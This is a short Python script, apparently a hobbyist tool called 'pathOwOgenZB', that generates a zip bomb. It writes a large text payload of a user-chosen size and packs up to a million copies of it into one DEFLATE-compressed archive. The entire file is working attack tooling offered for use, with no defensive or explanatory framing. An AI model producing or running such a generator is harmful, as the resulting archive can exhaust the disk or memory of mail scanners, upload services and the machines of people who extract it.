# This is CLOSED SOURCE software, written by Arco Nightshade.

import os
import zipfile

# Welcoming stuff and cwd finding
print("Welcome to pathOwOgenZB by Arco!")
print("Current working directory:", os.getcwd())

# Getting payload size in mb from user
size_mb = int(input("Payload size in mb (Full number): "))

# Function to create the ZB payload
def create_payload(payload_name = "pathOwOgen.md", payload_contents = "Uh oh! Looks like you got a pathOwOgen! "):
    with open(payload_name, "w") as OwOgen:
        OwOgen.write(payload_contents * 1024 * 1024 * size_mb)
    print(f"Final payload: {payload_name} ({size_mb}MB)")

# Getting the name of the zip bomb from user and making sure it ends with .zip
while True:
    zip_name = input("Zip name (Has to have .zip at end): ")
    if str(".zip") in zip_name:
        break
    else:
        print("Please make sure the name has '.zip' in it!")

# Getting the amount of payload copies in the final zip from user
copies = int(input("How many copies of the payload should be in the final zip? (Should be a full, non-negative number, never past 1,000,000.) "))

# Function for getting the payload file and duplicating it the specific amount of times the user specified
def zipper(payload_name = "pathOwOgen.md"):
    with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as Z:
        for i in range(copies):
            Z.write(payload_name, arcname=f"OwOgen{i}.md")
            print(f"Added file {i}")
        print()
        print(f"Added {i + 1} files total")
    print(f"PathOwOgenZB Zip created: {zip_name} with {copies} files.")

# Function execution
create_payload()
zipper()

# Optional payload file destruction
os.remove("pathOwOgen.md")
print("Removed the payload file")